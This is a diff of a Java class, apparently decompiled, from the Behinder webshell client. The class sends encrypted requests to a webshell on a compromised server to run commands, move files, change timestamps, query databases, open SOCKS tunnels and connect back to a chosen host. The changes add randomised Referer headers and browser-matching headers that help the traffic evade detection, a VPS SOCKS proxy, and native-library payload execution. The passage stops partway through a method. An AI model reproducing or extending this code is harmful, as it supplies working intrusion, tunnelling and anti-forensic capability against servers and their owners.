@@ -2,6 +2,7 @@ package net.rebeyond.behinder.core;
 
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.FileOutputStream;
+import java.net.URL;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -15,6 +16,7 @@ import java.util.Random;
 import java.util.Set;
 import javafx.application.Platform;
 import javafx.scene.control.Alert;
+import javafx.scene.control.Alert.AlertType;
 import javafx.stage.Window;
 import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONObject;
@@ -49,10 +51,53 @@ public class ShellService {
       this.currentHeaders.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
       this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7");
       if (this.currentType.equals("php")) {
-         this.currentHeaders.put("Content-Type", "text/html;charset=utf-8");
+         this.currentHeaders.put("Content-type", "application/x-www-form-urlencoded");
+      } else if (this.currentType.equals("aspx")) {
+         this.currentHeaders.put("Content-type", "application/octet-stream");
       }
 
       this.currentHeaders.put("User-Agent", this.getCurrentUserAgent());
+      if (((String)this.currentHeaders.get("User-Agent")).toLowerCase().indexOf("firefox") >= 0) {
+         this.currentHeaders.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+         this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
+      }
+
+      this.currentHeaders.put("Referer", this.getReferer());
+   }
+
+   private String getReferer() {
+      URL u = null;
+
+      try {
+         u = new URL(this.currentUrl);
+         String oldPath = u.getPath();
+         String newPath = "";
+         String ext = oldPath.substring(oldPath.lastIndexOf("."));
+         oldPath = oldPath.substring(0, oldPath.lastIndexOf("."));
+         String[] parts = oldPath.split("/");
+
+         for(int i = 0; i < parts.length; ++i) {
+            if (parts[i].length() != 0) {
+               if ((new Random()).nextBoolean()) {
+                  int randomNum = (new Random()).nextInt(parts[i].length());
+                  if (randomNum == 0) {
+                     randomNum = 4;
+                  }
+
+                  String randStr = (new Random()).nextBoolean() ? Utils.getRandomString(randomNum).toLowerCase() : Utils.getRandomString(randomNum).toUpperCase();
+                  newPath = newPath + "/" + randStr;
+               } else {
+                  newPath = newPath + "/" + parts[i];
+               }
+            }
+         }
+
+         newPath = newPath + ext;
+         String refer = this.currentUrl.replace(u.getPath(), newPath);
+         return refer;
+      } catch (Exception var10) {
+         return this.currentUrl;
+      }
    }
 
    private String getCurrentUserAgent() {
@@ -139,13 +184,13 @@ public class ShellService {
       boolean result = false;
       this.currentKey = Utils.getKey(this.currentPassword);
 
-      String content = null;
+      String content;
       try {
-         int randStringLength = 0;
-         JSONObject obj = null;
+         int randStringLength;
+         JSONObject obj;
          if (this.currentType.equals("php")) {
             try {
-               randStringLength = new SecureRandom().nextInt(3000);
+               randStringLength = (new SecureRandom()).nextInt(3000);
                content = Utils.getRandomString(randStringLength);
                obj = this.echo(content);
                if (obj.getString("msg").equals(content)) {
@@ -155,7 +200,7 @@ public class ShellService {
                this.encryptType = Constants.ENCRYPT_TYPE_XOR;
 
                try {
-                  randStringLength = new SecureRandom().nextInt(3000);
+                  randStringLength = (new SecureRandom()).nextInt(3000);
                   content = Utils.getRandomString(randStringLength);
                   obj = this.echo(content);
                   if (obj.getString("msg").equals(content)) {
@@ -172,7 +217,7 @@ public class ShellService {
                   this.encryptType = Constants.ENCRYPT_TYPE_XOR;
                }
 
-               randStringLength = new SecureRandom().nextInt(3000);
+               randStringLength = (new SecureRandom()).nextInt(3000);
                content = Utils.getRandomString(randStringLength);
                obj = this.echo(content);
                if (obj.getString("msg").equals(content)) {
@@ -184,6 +229,7 @@ public class ShellService {
          }
       } catch (Exception var12) {
          var12.printStackTrace();
+         System.out.println("The pre-shared key handshake fails and enters the dynamic key negotiation process.");
          Map keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
          content = (String)keyAndCookie.get("cookie");
          if ((content == null || content.equals("")) && !this.currentHeaders.containsKey("cookie")) {
@@ -228,24 +274,25 @@ public class ShellService {
 
       byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       result = new String(resData);
       return result;
    }
 
-   public JSONObject runCmd(String cmd) throws Exception {
+   public JSONObject runCmd(String cmd, String path) throws Exception {
       Map params = new LinkedHashMap();
       params.put("cmd", cmd);
+      params.put("path", path);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
       JSONObject result = new JSONObject(resultTxt);
-      Iterator var8 = result.keySet().iterator();
+      Iterator var9 = result.keySet().iterator();
 
-      while(var8.hasNext()) {
-         String key = (String)var8.next();
+      while(var9.hasNext()) {
+         String key = (String)var9.next();
          result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
       }
 
@@ -259,7 +306,7 @@ public class ShellService {
       params.put("localPort", localPort);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
       JSONObject result = new JSONObject(resultTxt);
@@ -280,7 +327,7 @@ public class ShellService {
       params.put("params", actionParams);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
       JSONObject result = new JSONObject(resultTxt);
@@ -302,7 +349,7 @@ public class ShellService {
       params.put("payload", Base64.encode(pluginData));
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
       JSONObject result = new JSONObject(resultTxt);
@@ -322,7 +369,7 @@ public class ShellService {
       params.put("action", "getResult");
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
       JSONObject result = new JSONObject(resultTxt);
@@ -341,7 +388,7 @@ public class ShellService {
       params.put("libPath", libPath);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "Loader", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -365,7 +412,7 @@ public class ShellService {
       params.put("whatever", Utils.getWhatever());
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result;
       if (!this.currentType.equals("php")) {
@@ -396,7 +443,7 @@ public class ShellService {
       params.put("whatever", Utils.getWhatever());
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result;
       if (!this.currentType.equals("php")) {
@@ -428,7 +475,7 @@ public class ShellService {
       params.put("whatever", Utils.getWhatever());
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var7 = result.keySet().iterator();
@@ -451,7 +498,7 @@ public class ShellService {
       params.put("cmd", Base64.encode(cmd.getBytes()));
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -470,7 +517,7 @@ public class ShellService {
       params.put("path", path);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -489,7 +536,7 @@ public class ShellService {
       params.put("path", path);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -507,11 +554,11 @@ public class ShellService {
       params.put("mode", "updateTimeStamp");
       params.put("path", path);
       params.put("createTimeStamp", createTimeStamp);
-      params.put("modifyTimeStamp", modifyTimeStamp);
       params.put("accessTimeStamp", accessTimeStamp);
+      params.put("modifyTimeStamp", modifyTimeStamp);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var11 = result.keySet().iterator();
@@ -534,7 +581,7 @@ public class ShellService {
       params.put("path", path);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -562,7 +609,7 @@ public class ShellService {
 
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var9 = result.keySet().iterator();
@@ -587,7 +634,7 @@ public class ShellService {
       params.put("newPath", newName);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var9 = result.keySet().iterator();
@@ -606,7 +653,7 @@ public class ShellService {
       params.put("path", fileName);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -625,7 +672,7 @@ public class ShellService {
       params.put("path", dirName);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var8 = result.keySet().iterator();
@@ -639,12 +686,11 @@ public class ShellService {
    }
 
    public void downloadFile(String remotePath, String localPath) throws Exception {
-      byte[] fileContent = null;
       Map params = new LinkedHashMap();
       params.put("mode", "download");
       params.put("path", remotePath);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
-      fileContent = (byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
+      byte[] fileContent = (byte[])((byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data"));
       FileOutputStream fso = new FileOutputStream(localPath);
       fso.write(fileContent);
       fso.flush();
@@ -662,7 +708,7 @@ public class ShellService {
       params.put("sql", sql);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "Database", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var14 = result.keySet().iterator();
@@ -678,15 +724,15 @@ public class ShellService {
    public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
       Map params = new LinkedHashMap();
       JSONObject result = null;
-      byte[] data = null;
-      String resultTxt = null;
+      byte[] data;
+      String resultTxt;
       if (!useBlock) {
          params.put("mode", "create");
          params.put("path", remotePath);
          params.put("content", Base64.encode(fileContent));
          data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
          Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-         data = (byte[])resultObj.get("data");
+         data = (byte[])((byte[])resultObj.get("data"));
          resultTxt = new String(Crypt.Decrypt(data, this.currentKey, this.encryptType, this.currentType));
          result = new JSONObject(resultTxt);
          Iterator var10 = result.keySet().iterator();
@@ -709,7 +755,7 @@ public class ShellService {
             params.put("content", Base64.encode((byte[])blocks.get(i)));
             data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
             Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-            byte[] resData = (byte[])resultObj.get("data");
+            byte[] resData = (byte[])((byte[])resultObj.get("data"));
             resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
             result = new JSONObject(resultTxt);
             Iterator var12 = result.keySet().iterator();
@@ -731,7 +777,7 @@ public class ShellService {
       params.put("content", Base64.encode(fileContent));
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var9 = result.keySet().iterator();
@@ -751,7 +797,7 @@ public class ShellService {
       params.put("content", Base64.encode(fileContent));
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
       Iterator var9 = result.keySet().iterator();
@@ -778,7 +824,7 @@ public class ShellService {
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
       Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       Map resHeader = (Map)result.get("header");
-      byte[] resData = (byte[])result.get("data");
+      byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
@@ -801,7 +847,7 @@ public class ShellService {
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
       Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       Map resHeader = (Map)result.get("header");
-      byte[] resData = (byte[])result.get("data");
+      byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
@@ -814,6 +860,45 @@ public class ShellService {
       }
    }
 
+   public boolean createVPSSocks(String remoteIP, String remotePort) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "create");
+      params.put("remoteIP", remoteIP);
+      params.put("remotePort", remotePort);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RemoteSocksProxy", params, this.currentType);
+      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      Map resHeader = (Map)result.get("header");
+      byte[] resData = (byte[])((byte[])result.get("data"));
+      if (((String)resHeader.get("status")).equals("200")) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
+            resData = Arrays.copyOfRange(resData, 4, resData.length);
+            throw new Exception(new String(resData));
+         } else {
+            return true;
+         }
+      } else {
+         return false;
+      }
+   }
+
+   public JSONObject stopVPSSocks() throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "stop");
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RemoteSocksProxy", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var7 = result.keySet().iterator();
+
+      while(var7.hasNext()) {
+         String key = (String)var7.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
    public boolean createPortMap(String targetIP, String targetPort, String socketHash) throws Exception {
       Map params = new LinkedHashMap();
       params.put("action", "createLocal");
@@ -823,7 +908,7 @@ public class ShellService {
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
       Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       Map resHeader = (Map)result.get("header");
-      byte[] resData = (byte[])result.get("data");
+      byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
@@ -860,9 +945,10 @@ public class ShellService {
 
       Map resHeader = (Map)result.get("header");
       if (((String)resHeader.get("status")).equals("200")) {
-         resData = (byte[])result.get("data");
+         resData = (byte[])((byte[])result.get("data"));
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
-            return null;
+            resData = Arrays.copyOfRange(resData, 4, resData.length);
+            throw new Exception(new String(resData));
          }
 
          if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
@@ -894,7 +980,7 @@ public class ShellService {
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
       Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       Map resHeader = (Map)result.get("header");
-      byte[] resData = (byte[])result.get("data");
+      byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
@@ -912,6 +998,15 @@ public class ShellService {
       params.put("action", "closeLocal");
       params.put("targetIP", targetIP);
       params.put("targetPort", targetPort);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
+      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
+      return ((String)resHeader.get("status")).equals("200");
+   }
+
+   public boolean closeLocalPortMapWorker(String socketHash) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "closeLocalWorker");
+      params.put("socketHash", socketHash);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
       Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
       return ((String)resHeader.get("status")).equals("200");
@@ -951,8 +1046,9 @@ public class ShellService {
 
       Map resHeader = (Map)result.get("header");
       if (((String)resHeader.get("status")).equals("200")) {
-         resData = (byte[])result.get("data");
+         resData = (byte[])((byte[])result.get("data"));
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
+            System.out.println(new String(resData));
             resData = null;
          } else {
             if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
@@ -980,7 +1076,7 @@ public class ShellService {
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
       Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       Map resHeader = (Map)result.get("header");
-      byte[] resData = (byte[])result.get("data");
+      byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
@@ -1011,7 +1107,7 @@ public class ShellService {
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
       Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       Map resHeader = (Map)result.get("header");
-      byte[] resData = (byte[])result.get("data");
+      byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
          if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
@@ -1042,7 +1138,7 @@ public class ShellService {
 
       String localResultTxt = "{\"status\":\"c3VjY2Vzcw==\",\"msg\":\"" + new String(java.util.Base64.getEncoder().encode(content.getBytes())) + "\"}";
       byte[] localResult = Crypt.Encrypt(localResultTxt.getBytes(), this.currentKey, this.currentType, this.encryptType);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       new String(resData);
       this.beginIndex = Utils.matchData(resData, localResult);
       if (this.beginIndex < 0) {
@@ -1071,19 +1167,18 @@ public class ShellService {
       params.put("whatever", whatever);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
 
       try {
          result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
          return result;
       } catch (Exception var8) {
-         var8.printStackTrace();
          throw new Exception("请求失败:" + new String(resData, "UTF-8"));
       }
    }
 
    private void showErrorMessage(String title, String msg) {
-      Alert alert = new Alert(Alert.AlertType.ERROR);
+      Alert alert = new Alert(AlertType.ERROR);
       Window window = alert.getDialogPane().getScene().getWindow();
       window.setOnCloseRequest((event) -> {
          window.hide();
@@ -1108,7 +1203,7 @@ public class ShellService {
             Platform.runLater(() -> {
                this.showErrorMessage("提示", "由于您长时间未操作，当前连接会话已超时，请重新打开该网站。");
             });
-            var2.printStackTrace();
+            return;
          }
       }
    }
@@ -1120,13 +1215,343 @@ public class ShellService {
       params.put("port", port);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "ConnectBack", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
-      byte[] resData = (byte[])resultObj.get("data");
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+
+      try {
+         JSONObject result = new JSONObject(resultTxt);
+         Iterator var10 = result.keySet().iterator();
+
+         while(var10.hasNext()) {
+            String key = (String)var10.next();
+            result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+         }
+
+         return result;
+      } catch (Exception var12) {
+         throw new Exception(resultTxt);
+      }
+   }
+
+   public JSONObject loadNativeLibrary(String libraryPath) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "load");
+      params.put("whatever", Utils.getWhatever());
+      params.put("libraryPath", libraryPath);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
-      Iterator var10 = result.keySet().iterator();
+      Iterator var8 = result.keySet().iterator();
 
-      while(var10.hasNext()) {
-         String key = (String)var10.next();
+      while(var8.hasNext()) {
+         String key = (String)var8.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject executePayload(String uploadLibPath, String payload) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "execute");
+      params.put("whatever", Utils.getWhatever());
+      params.put("uploadLibPath", uploadLibPath);
+      params.put("payload", payload);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
